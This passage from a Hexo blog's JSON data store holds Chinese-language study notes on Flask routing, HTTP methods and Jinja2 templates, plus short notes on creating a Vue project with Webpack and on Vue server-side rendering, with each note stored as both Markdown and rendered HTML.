class=\"hljs-string\">&#x27;login.html&#x27;</span>)<br></code></pre></td></tr></table></figure>\n\n<p>Flask 将尝试在 templates 文件夹中找到与此脚本所在的文件夹中的 HTML 文件。</p>\n<p>Jinja2 使用一下定界符从 HTML 转义：</p>\n<p>{.% … %.} for statements<br>{.{ … }.} for expression to print to the template output</p>\n for comments not included in the template output\n\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-meta\">&lt;!DOCTYPE <span class=\"hljs-keyword\">html</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">html</span> <span class=\"hljs-attr\">lang</span>=<span class=\"hljs-string\">&quot;en&quot;</span>&gt;</span><br>  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">head</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">meta</span> <span class=\"hljs-attr\">charset</span>=<span class=\"hljs-string\">&quot;UTF-8&quot;</span> /&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">meta</span> <span class=\"hljs-attr\">http-equiv</span>=<span class=\"hljs-string\">&quot;X-UA-Compatible&quot;</span> <span class=\"hljs-attr\">content</span>=<span class=\"hljs-string\">&quot;IE=edge&quot;</span> /&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">meta</span> <span class=\"hljs-attr\">name</span>=<span class=\"hljs-string\">&quot;viewport&quot;</span> <span class=\"hljs-attr\">content</span>=<span class=\"hljs-string\">&quot;width=device-width, initial-scale=1.0&quot;</span> /&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">title</span>&gt;</span>Document<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">title</span>&gt;</span><br>  <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">head</span>&gt;</span><br><br>  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">body</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">h1</span>&gt;</span>Welcome,&#123;&#123; name &#125;&#125;<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">h1</span>&gt;</span><br>    &#123;% if age &gt; 20 %&#125;<br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">h2</span>&gt;</span>You are very nice~<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">h2</span>&gt;</span><br>    &#123;% else %&#125;<br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">h2</span>&gt;</span>You are very young~<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">h2</span>&gt;</span><br>    &#123;% endif %&#125;<br>  <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">body</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">html</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"5-静态文件\"><a href=\"#5-静态文件\" class=\"headerlink\" title=\"5. 静态文件\"></a>5. 静态文件</h3><p>网络应用程序通常需要一个静态文件，例如支持显示网页的 js 文件或者 css 文件；</p>\n<p>通常，网络服务器配置服务，但是在开发过程中，这些文件从 static 文件夹或者模块旁提供；</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span></span><br><span class=\"hljs-tag\">  <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">&quot;text/javascript&quot;</span></span><br><span class=\"hljs-tag\">  <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename = &#x27;index.js&#x27;) &#125;&#125;&quot;</span></span><br><span class=\"hljs-tag\">&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"6-Flask-请求对象\"><a href=\"#6-Flask-请求对象\" class=\"headerlink\" title=\"6. Flask 请求对象\"></a>6. Flask 请求对象</h3><p>来自客户端网页得数据作为全局请求对象发送到服务器。</p>\n<ul>\n<li>表单：字典对象，包含表单参数键值对</li>\n<li>args：在问号后面得 url 得一部分查询字符串得解析内容</li>\n<li>cookie:保存 cookie 名称和值得字典对象</li>\n<li>文件：与上传文件相关得数据</li>\n<li>方法：当前请求方法</li>\n</ul>\n<h3 id=\"7-将表单数据发送到模板\"><a href=\"#7-将表单数据发送到模板\" class=\"headerlink\" title=\"7. 将表单数据发送到模板\"></a>7. 将表单数据发送到模板</h3><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs\"><br></code></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Flask-基础\"><a href=\"#Flask-基础\" class=\"headerlink\" title=\"Flask 基础\"></a>Flask 基础</h1><h2 id=\"一、基础概念\"><a href=\"#一、基础概念\" class=\"headerlink\" title=\"一、基础概念\"></a>一、基础概念</h2><ul>\n<li>Web 框架，一组库和模块，使 Web 应用程序开发人员能够编写应用程序，而不必担心协议、线程管理等低级细节；</li>\n<li>Flask，由 Python 编写的 web 应用程序框架，基于 Werkzeug WSGI 工具包和 Jinja2 模板引擎。</li>\n<li>WSGI，Web Server Gateway Interface， Web 服务器网关接口，是 web 服务器和 web 应用程序之间通用接口的规范。</li>\n<li>Werkzeug，WSGI 工具包，实现了请求，响应对象和其他使用函数。</li>\n<li>Flask 环境，安装 Flask 需要 Python2.6 或者更高版本，虽然 flask 及其以来适用于 Python3，但是很多 Flask 拓展并不支持，建议在 python2.7 安装 flask</li>\n</ul>\n<h2 id=\"二、环境安装\"><a href=\"#二、环境安装\" class=\"headerlink\" title=\"二、环境安装\"></a>二、环境安装</h2><ol>\n<li>安装虚拟环境</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">pip install virtualenv<br>sudo apt-get install virtualenv<br></code></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>新建文件夹，创建虚拟环境</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">mkdir newPro<br>cd newPro<br>virtualenv venv<br>venv\\scripts\\activate<br>pip install flask<br>pip install flask -i http://pypi.douban.com/simple/ --trusted-host pypi.douban.com<br></code></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>测试</li>\n</ol>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> flask <span class=\"hljs-keyword\">import</span> Flask<br><br><span class=\"hljs-comment\"># flask构造函数使用当前模块（_name_）名称作为参数</span><br>app = Flask(__name__)<br><br><span class=\"hljs-comment\">#route()函数是一个装饰器，告诉应用程序那个url应该调用（rule,options)</span><br><span class=\"hljs-comment\">#rule参数表示该函数的url绑定，options是要转发给基础rule对象的参数列表</span><br><span class=\"hljs-meta\">@app.route(<span class=\"hljs-params\"><span class=\"hljs-string\">&#x27;/&#x27;</span></span>)</span><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">index</span>():<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">&#x27;&lt;h1&gt;Hello World!&lt;/h1&gt;&#x27;</span><br><br><span class=\"hljs-meta\">@app.route(<span class=\"hljs-params\"><span class=\"hljs-string\">&#x27;/user&#x27;</span></span>)</span><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">getUserInfor</span>():<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">&#x27;&lt;h1&gt;user page&lt;/h1&gt;&#x27;</span><br><br><br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class=\"hljs-string\">&quot;127.0.0.1&quot;</span>,port=<span class=\"hljs-string\">&quot;3333&quot;</span>,debug=<span class=\"hljs-literal\">True</span>)<br></code></pre></td></tr></table></figure>\n\n<p>现代 Web 框架使用路由技术来帮助用户记住应用程序 URL。 可以直接访问所需的页面，而无需从主页导航。</p>\n<h2 id=\"三、基础使用\"><a href=\"#三、基础使用\" class=\"headerlink\" title=\"三、基础使用\"></a>三、基础使用</h2><h3 id=\"1-变量规则\"><a href=\"#1-变量规则\" class=\"headerlink\" title=\"1. 变量规则\"></a>1. 变量规则</h3><ul>\n<li><p>string</p>\n</li>\n<li><p>int</p>\n</li>\n<li><p>float</p>\n</li>\n<li><p>path：接受用作目录分隔符的斜杠</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><br><span class=\"hljs-meta\">@app.route(<span class=\"hljs-params\"><span class=\"hljs-string\">&#x27;/user/&lt;int:id&gt;&#x27;</span></span>)</span><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">getUserID</span>(<span class=\"hljs-params\"><span class=\"hljs-built_in\">id</span></span>):<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">&#x27;&lt;h1&gt;Hello,%d!&lt;/h1&gt;&#x27;</span>%<span class=\"hljs-built_in\">id</span><br><br><span class=\"hljs-meta\">@app.route(<span class=\"hljs-params\"><span class=\"hljs-string\">&#x27;/user/&lt;float:id&gt;&#x27;</span></span>)</span><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">getUserID2</span>(<span class=\"hljs-params\"><span class=\"hljs-built_in\">id</span></span>):<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">&#x27;&lt;h1&gt;Hello,%f!&lt;/h1&gt;&#x27;</span>%<span class=\"hljs-built_in\">id</span><br><br><span class=\"hljs-meta\">@app.route(<span class=\"hljs-params\"><span class=\"hljs-string\">&#x27;/user/&lt;path:id&gt;&#x27;</span></span>)</span><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">getUserID3</span>(<span class=\"hljs-params\"><span class=\"hljs-built_in\">id</span></span>):<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">&#x27;&lt;h1&gt;Hello,%s!&lt;/h1&gt;&#x27;</span>%<span class=\"hljs-built_in\">id</span><br></code></pre></td></tr></table></figure></li>\n</ul>\n<h3 id=\"2-URL-构建\"><a href=\"#2-URL-构建\" class=\"headerlink\" title=\"2. URL 构建\"></a>2. URL 构建</h3><p><strong>url_for（）</strong>函数对于动态构建特定函数的 URL 非常有用。 该函数接受函数的名称作为第一个参数，以及一个或多个关键字参数，每个参数对应于 URL 的可变部分</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><br><span class=\"hljs-meta\">@app.route(<span class=\"hljs-params\"><span class=\"hljs-string\">&#x27;/show_blog/&lt;int:postID&gt;&#x27;</span></span>)</span><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">show_blog</span>(<span class=\"hljs-params\">postID</span>):<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">&#x27;&lt;h1&gt;blog number is %d&lt;/h1&gt;&#x27;</span>%postID<br><br><span class=\"hljs-meta\">@app.route(<span class=\"hljs-params\"><span class=\"hljs-string\">&#x27;/blog/&lt;int:postID&gt;&#x27;</span></span>)</span><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">show_blog_admin</span>(<span class=\"hljs-params\">postID</span>):<br>    <span class=\"hljs-keyword\">if</span> postID==<span class=\"hljs-number\">0</span>:<br>      <span class=\"hljs-keyword\">return</span> redirect(url_for(<span class=\"hljs-string\">&#x27;show_blog&#x27;</span>,postID=<span class=\"hljs-number\">1</span>))<br>    <span class=\"hljs-keyword\">else</span>:<br>      <span class=\"hljs-keyword\">return</span> redirect(url_for(<span class=\"hljs-string\">&#x27;show_blog&#x27;</span>,postID=postID))<br><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"3-Http-方法\"><a href=\"#3-Http-方法\" class=\"headerlink\" title=\"3. Http 方法\"></a>3. Http 方法</h3><p>在此协议中，定义了从指定的 URL 检索不同的数据方法</p>\n<ul>\n<li>GET：不加密发送数据到服务器</li>\n<li>HEAD：和 GET 一样，没有响应体（？）</li>\n<li>POST：用于将 HTML 表单数据发送到服务器，POST 方法接收的数据不由服务器缓存</li>\n<li>PUT：用所上传的内容替换目标资源的所有当前表示</li>\n<li>DELETE：删除由 URL 给定的目标资源的所有当前表示</li>\n</ul>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs py\"><span class=\"hljs-keyword\">from</span> flask <span class=\"hljs-keyword\">import</span> Flask,redirect,url_for,render_template,request,session,flash<br><br>app=Flask(__name__)<br><br><span class=\"hljs-meta\">@app.route(<span class=\"hljs-params\"><span class=\"hljs-string\">&#x27;/success/&lt;name&gt;&#x27;</span></span>)</span><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">success</span>(<span class=\"hljs-params\">name</span>):<br>  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">&#x27;welcome %s&#x27;</span>%name<br><br><span class=\"hljs-meta\">@app.route(<span class=\"hljs-params\"><span class=\"hljs-string\">&#x27;/login&#x27;</span>,methods=[<span class=\"hljs-string\">&#x27;POST&#x27;</span>,<span class=\"hljs-string\">&#x27;GET&#x27;</span>]</span>)</span><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">login</span>():<br>  <span class=\"hljs-keyword\">if</span> request.method==<span class=\"hljs-string\">&#x27;POST&#x27;</span>:<br>    user=request.form[<span class=\"hljs-string\">&#x27;nm&#x27;</span>]<br>    <span class=\"hljs-keyword\">return</span> redirect(url_for(<span class=\"hljs-string\">&#x27;success&#x27;</span>,name=<span class=\"hljs-string\">&#x27;POST:&#x27;</span>+user))<br>  <span class=\"hljs-keyword\">else</span>:<br>    user=request.args.get(<span class=\"hljs-string\">&#x27;nm&#x27;</span>)<br>    <span class=\"hljs-keyword\">return</span> redirect(url_for(<span class=\"hljs-string\">&#x27;success&#x27;</span>,name=<span class=\"hljs-string\">&#x27;GET:&#x27;</span>+user))<br><br><span class=\"hljs-keyword\">if</span> __name__==<span class=\"hljs-string\">&#x27;__main__&#x27;</span>:<br>  app.run(debug=<span class=\"hljs-literal\">True</span>)<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>服务器通过 post 方法接收数据，从表单数据获得的“nm”参数的值通过</li>\n</ul>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs py\">user=request.form[<span class=\"hljs-string\">&#x27;nm&#x27;</span>]<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>服务器通过 get 方法接收数据，从表单数据获得的“nm”参数通过</li>\n</ul>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs py\">User=request.args.get(<span class=\"hljs-string\">&#x27;nm&#x27;</span>)<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"4-模板\"><a href=\"#4-模板\" class=\"headerlink\" title=\"4.模板\"></a>4.模板</h3><p>可以以 HTML 的形式返回绑定到某个 URL 的函数输出</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-meta\">@app.route(<span class=\"hljs-params\"><span class=\"hljs-string\">&#x27;/&#x27;</span></span>)</span><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">index</span>():<br>   <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">&#x27;&lt;html&gt;&lt;body&gt;&lt;h1&gt;Hello World&#x27;</span>&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;<span class=\"hljs-string\">&#x27;</span><br><span class=\"hljs-string\"></span><br></code></pre></td></tr></table></figure>\n\n<p>从 python 代码返回 HTML 很麻烦，可以利用基于 Flask 的 Jinja2 模板引擎，通过<code>render_template()</code>函数呈现 HTML 文件</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-meta\">@app.route(<span class=\"hljs-params\"><span class=\"hljs-string\">&#x27;/&#x27;</span></span>)</span><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">index</span>():<br>    <span class=\"hljs-keyword\">return</span> render_template(<span class=\"hljs-string\">&#x27;login.html&#x27;</span>)<br></code></pre></td></tr></table></figure>\n\n<p>Flask 将尝试在 templates 文件夹中找到与此脚本所在的文件夹中的 HTML 文件。</p>\n<p>Jinja2 使用一下定界符从 HTML 转义：</p>\n<p>{.% … %.} for statements<br>{.{ … }.} for expression to print to the template output</p>\n for comments not included in the template output\n\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-meta\">&lt;!DOCTYPE <span class=\"hljs-keyword\">html</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">html</span> <span class=\"hljs-attr\">lang</span>=<span class=\"hljs-string\">&quot;en&quot;</span>&gt;</span><br>  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">head</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">meta</span> <span class=\"hljs-attr\">charset</span>=<span class=\"hljs-string\">&quot;UTF-8&quot;</span> /&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">meta</span> <span class=\"hljs-attr\">http-equiv</span>=<span class=\"hljs-string\">&quot;X-UA-Compatible&quot;</span> <span class=\"hljs-attr\">content</span>=<span class=\"hljs-string\">&quot;IE=edge&quot;</span> /&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">meta</span> <span class=\"hljs-attr\">name</span>=<span class=\"hljs-string\">&quot;viewport&quot;</span> <span class=\"hljs-attr\">content</span>=<span class=\"hljs-string\">&quot;width=device-width, initial-scale=1.0&quot;</span> /&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">title</span>&gt;</span>Document<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">title</span>&gt;</span><br>  <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">head</span>&gt;</span><br><br>  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">body</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">h1</span>&gt;</span>Welcome,&#123;&#123; name &#125;&#125;<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">h1</span>&gt;</span><br>    &#123;% if age &gt; 20 %&#125;<br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">h2</span>&gt;</span>You are very nice~<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">h2</span>&gt;</span><br>    &#123;% else %&#125;<br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">h2</span>&gt;</span>You are very young~<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">h2</span>&gt;</span><br>    &#123;% endif %&#125;<br>  <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">body</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">html</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"5-静态文件\"><a href=\"#5-静态文件\" class=\"headerlink\" title=\"5. 静态文件\"></a>5. 静态文件</h3><p>网络应用程序通常需要一个静态文件，例如支持显示网页的 js 文件或者 css 文件；</p>\n<p>通常，网络服务器配置服务，但是在开发过程中，这些文件从 static 文件夹或者模块旁提供；</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span></span><br><span class=\"hljs-tag\">  <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">&quot;text/javascript&quot;</span></span><br><span class=\"hljs-tag\">  <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename = &#x27;index.js&#x27;) &#125;&#125;&quot;</span></span><br><span class=\"hljs-tag\">&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"6-Flask-请求对象\"><a href=\"#6-Flask-请求对象\" class=\"headerlink\" title=\"6. Flask 请求对象\"></a>6. Flask 请求对象</h3><p>来自客户端网页得数据作为全局请求对象发送到服务器。</p>\n<ul>\n<li>表单：字典对象，包含表单参数键值对</li>\n<li>args：在问号后面得 url 得一部分查询字符串得解析内容</li>\n<li>cookie:保存 cookie 名称和值得字典对象</li>\n<li>文件：与上传文件相关得数据</li>\n<li>方法：当前请求方法</li>\n</ul>\n<h3 id=\"7-将表单数据发送到模板\"><a href=\"#7-将表单数据发送到模板\" class=\"headerlink\" title=\"7. 将表单数据发送到模板\"></a>7. 将表单数据发送到模板</h3><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs\"><br></code></pre></td></tr></table></figure>\n"},{"_content":"# Webpack\n\n### 1.使用webpack创建项目\n\n```shell\nvue init webpack vueDemo\n```\n\n","source":"_posts/Webpack.md","raw":"# Webpack\n\n### 1.使用webpack创建项目\n\n```shell\nvue init webpack vueDemo\n```\n\n","slug":"Webpack","published":1,"date":"2023-06-29T12:01:46.259Z","updated":"2023-06-29T12:10:09.115Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"cljnys8nm0004ls9c4pn30eyp","content":"<h1 id=\"Webpack\"><a href=\"#Webpack\" class=\"headerlink\" title=\"Webpack\"></a>Webpack</h1><h3 id=\"1-使用webpack创建项目\"><a href=\"#1-使用webpack创建项目\" class=\"headerlink\" title=\"1.使用webpack创建项目\"></a>1.使用webpack创建项目</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">vue init webpack vueDemo<br></code></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Webpack\"><a href=\"#Webpack\" class=\"headerlink\" title=\"Webpack\"></a>Webpack</h1><h3 id=\"1-使用webpack创建项目\"><a href=\"#1-使用webpack创建项目\" class=\"headerlink\" title=\"1.使用webpack创建项目\"></a>1.使用webpack创建项目</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">vue init webpack vueDemo<br></code></pre></td></tr></table></figure>\n\n"},{"_content":"# 服务端渲染SSR\n\n## 一、什么是SSR？\n\n> vue支持在浏览器生成和操作DOM，也支持在服务端直接渲染成HTML字符串，作为服务器响应返回给浏览器；\n>\n> 浏览器将静态HTML激活为客户端能够交互的应用；\n>\n> 一个由服务端渲染的VueJS可以被认为是同构的或者通用的，因为吧大部分代码同时运行在服务端和客户端；\n\n### 1.SSR优势\n\n- 更快的首屏加载速度：有利于慢网速和运行缓慢的设备。\n\n（1）渲染方面：服务端渲染的HTML无需等待苏哦有的JS下载执行完毕才可以显示；\n\n（2）数据传输：数据获取过程在首次访问时在服务端完成，可能有更快的数据库连接；\n\n- 廷议的心智模型：可以使用相同的语言以及相同的声明式，面向组建的心智模型来开发整个应用，不需要再后端模板系统和前端框架之间来回切换；\n- 更好的SEO：搜索引擎爬虫可直接看到完全渲染的页面；\n\n> 如果你的应用以一个 loading 动画开始，然后通过 Ajax 获取内容，爬虫并不会等到内容加载完成再抓取。也就是说，如果 SEO 对你的页面至关重要，而你的内容又是异步获取的，那么 SSR 可能是必需的。\n\n### 2.SSR劣势\n\n- 开发限制：浏览器特定的代码只能在某些生命周期钩子使用；外部库可能需要经过特殊处理才能在服务端渲染的应用中运行；\n- 更多的构建配置和部署相关的要求。需要一个让NodeJS运行的服务器环境。\n- 更高的服务端负载；\n\n### 3.SSG\n\n静态站点生成，又称预渲染，如果一个站点的数据对每个用户来说都是相同的，那就可以渲染一次，生成的静态HTML文件放在服务器托管。每当数据变化时，都需要重新部署。\n\n## 二、基础使用\n\n### 1.渲染一个应用\n\n\n\n\n\n","source":"_posts/服务端渲染.md","raw":"# 服务端渲染SSR\n\n## 一、什么是SSR？\n\n> vue支持在浏览器生成和操作DOM，也支持在服务端直接渲染成HTML字符串，作为服务器响应返回给浏览器；\n>\n> 浏览器将静态HTML激活为客户端能够交互的应用；\n>\n> 一个由服务端渲染的VueJS可以被认为是同构的或者通用的，因为吧大部分代码同时运行在服务端和客户端；\n\n### 1.SSR优势\n\n- 更快的首屏加载速度：有利于慢网速和运行缓慢的设备。\n\n（1）渲染方面：服务端渲染的HTML无需等待苏哦有的JS下载执行完毕才可以显示；\n\n（2）数据传输：数据获取过程在首次访问时在服务端完成，可能有更快的数据库连接；\n\n- 廷议的心智模型：可以使用相同的语言以及相同的声明式，面向组建的心智模型来开发整个应用，不需要再后端模板系统和前端框架之间来回切换；\n- 更好的SEO：搜索引擎爬虫可直接看到完全渲染的页面；\n\n> 如果你的应用以一个 loading 动画开始，然后通过 Ajax 获取内容，爬虫并不会等到内容加载完成再抓取。也就是说，如果 SEO 对你的页面至关重要，而你的内容又是异步获取的，那么 SSR 可能是必需的。\n\n### 2.SSR劣势\n\n- 开发限制：浏览器特定的代码只能在某些生命周期钩子使用；外部库可能需要经过特殊处理才能在服务端渲染的应用中运行；\n- 更多的构建配置和部署相关的要求。需要一个让NodeJS运行的服务器环境。\n- 更高的服务端负载；\n\n### 3.SSG\n\n静态站点生成，又称预渲染，如果一个站点的数据对每个用户来说都是相同的，那就可以渲染一次，生成的静态HTML文件放在服务器托管。每当数据变化时，都需要重新部署。\n\n## 二、基础使用\n\n### 